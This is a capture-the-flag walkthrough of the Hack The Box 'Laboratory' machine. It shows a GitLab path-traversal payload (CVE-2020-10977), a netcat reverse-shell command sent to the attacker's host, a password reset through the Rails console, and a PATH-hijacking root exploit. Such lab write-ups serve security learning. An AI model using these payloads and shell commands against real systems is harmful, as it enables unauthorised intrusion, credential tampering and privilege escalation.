# Hack The Box: Laboratory

**Difficulty:** Easy
**OS:** Linux

Laboratory is an Easy-level Linux machine designed to demonstrate common vulnerabilities in enterprise deployment tools, specifically GitLab. The initial foothold requires enumerating a web application to discover a hidden GitLab instance, registering an account, and exploiting a known Arbitrary File Read vulnerability leading to Remote Code Execution (CVE-2020-10977). Privilege escalation involves identifying a custom SUID binary and exploiting an insecure PATH implementation to gain a root shell.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.216
nmap -p 22,80,443 -sCV 10.10.10.216
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (nginx)
*   **Port 443:** HTTPS (nginx)

Navigating to the web service on port 443 displays a landing page for "Laboratory," a company dealing in medical or scientific software. The HTTP response headers and certificate Subject Alternative Names (SANs) reveal the primary domain `laboratory.htb` and a crucial subdomain `git.laboratory.htb`. We add these domains to our local `/etc/hosts` file.

```bash
echo "10.10.10.216 laboratory.htb git.laboratory.htb" >> /etc/hosts
```

Accessing `http://laboratory.htb` shows a static site. However, `https://git.laboratory.htb` brings up a GitLab Community Edition login portal.

## Web Application Analysis

The GitLab instance is the primary target. We explore the login page to gather intelligence about the deployed version. Often, the help or API endpoints reveal version information.

### Exploiting GitLab (CVE-2020-10977)

By accessing `https://git.laboratory.htb/help`, we identify the GitLab version as 12.8.1. Researching this specific version reveals a critical vulnerability (CVE-2020-10977). The vulnerability is an Arbitrary File Read flaw that can be escalated to Remote Code Execution (RCE).

The vulnerability exists in the project issue feature. When moving an issue between projects, the application improperly handles a specific parameter (`file_name`), allowing an attacker to read arbitrary files. This file read capability can then be used to steal the GitLab instance's `secrets.yml` file, which contains the key used to sign cookies. With this key, an attacker can forge administrative cookies and execute code via the GitLab rails console or web interface.

First, we must register an account on the GitLab instance. We create a user (e.g., `testuser:password`) and log in.

We create two projects (e.g., `project1` and `project2`). In `project1`, we create a new issue. The exploit involves modifying the description of the issue to include a crafted markdown payload that exploits the file read vulnerability when the issue is moved to `project2`.

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

We move the issue to `project2`. When viewing the moved issue, GitLab parses the markdown and attempts to load the "image," effectively reading the target file (`/etc/passwd`). The contents are displayed or can be downloaded via the image link.

We confirm the file read vulnerability. Our next step is to retrieve the GitLab secrets file (`/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`).

We use the same LFI payload to read `secrets.yml`. The file contains the `secret_key_base`.

### Escalating to RCE

With the `secret_key_base` in hand, we can forge a valid session cookie for an administrator or execute arbitrary code using serialized payloads. 

There are several publicly available exploit scripts for CVE-2020-10977 that automate the process of reading `secrets.yml`, generating a malicious cookie, and triggering RCE.

We download a suitable Python exploit script from Exploit-DB or GitHub and execute it against the target.

```bash
# Generating the payload locally
python3 exploit.py https://git.laboratory.htb testuser <secret_key_base> "nc -e /bin/sh 10.10.14.X 9999"
```

The script crafts a malicious serialized payload (often using the `ActionView` gadget chain in Ruby on Rails) and sends it to the server. The GitLab instance deserializes the cookie, triggering the execution of our reverse shell payload.

We catch the reverse shell on our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=998(git) gid=998(git) groups=998(git)
```

## Lateral Movement

We gain initial access as the `git` user within the GitLab environment (likely a Docker container or a dedicated application user). We stabilize our shell using Python.

The `user.txt` flag is not accessible in our current directory, indicating we must pivot to another user account. Checking the `/home` directory on the host system (if accessible) or within the container reveals a user named `dexter`.

We search for hardcoded credentials, configuration files, or database access. Within the GitLab environment, we can interact with the GitLab rails console (`gitlab-rails console`) to interact directly with the application's database.

```bash
gitlab-rails console
# Wait for the console to load...
```

Inside the Rails console, we can reset the password for any user, including the administrator (`root`) or a specific user like `dexter`.

```ruby
user = User.find_by(username: 'dexter')
user.password = 'NewPassword123!'
user.password_confirmation = 'NewPassword123!'
user.save!
```

If the user `dexter` exists within GitLab and the credentials match system accounts, we test for password reuse by attempting to authenticate via SSH as the system user `dexter`.

```bash
ssh dexter@10.10.10.216
# Authentication successful
```
We retrieve the `user.txt` flag from Dexter's home directory.

## Privilege Escalation

Enumerating the system as `dexter`, we check for `sudo` privileges and SUID binaries.

```bash
find / -perm -4000 2>/dev/null
```

The output reveals a custom SUID binary named `docker-security`, which appears to be a management or security wrapper for Docker commands.

### Exploiting an Unquoted Service Path (Path Hijacking)

We analyze the `docker-security` binary. Running it simply outputs system statistics or Docker container status. To understand how it operates, we download it to our attacking machine for static analysis (using `strings` or Ghidra) or analyze it dynamically on the target using `ltrace` (if installed and permitted).

```bash
ltrace ./docker-security
```

Dynamic analysis or running `strings` on the binary reveals that it calls standard system utilities to manage containers, such as `docker` or `chmod`. Crucially, it calls these utilities without using their absolute paths (e.g., `system("chmod")` instead of `system("/bin/chmod")`).

Because the binary does not specify absolute paths, it relies on the `PATH` environment variable to locate the executables. Since the binary has the SUID bit set, it runs with the privileges of its owner (root).

We exploit this "Path Hijacking" vulnerability by creating a malicious executable named after one of the utilities called by `docker-security` (e.g., `chmod`), placing it in a directory we control (like `/tmp`), and modifying the `PATH` variable so our malicious executable is found before the legitimate system utility.

```bash
echo "#!/bin/bash" > /tmp/chmod
echo "/bin/bash -p" >> /tmp/chmod
chmod +x /tmp/chmod
```

We execute the SUID binary, overriding the `PATH` environment variable to prioritize `/tmp`.

```bash
PATH=/tmp:$PATH /usr/local/bin/docker-security
```

When the script runs as root, it attempts to execute `chmod`. Because our `/tmp` directory is first in the `PATH`, it executes our malicious `chmod` script instead of the legitimate system binary.

Our script executes `bash -p`, providing an interactive shell.

```bash
# id
uid=0(root) gid=1000(dexter) euid=0(root) groups=1000(dexter)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
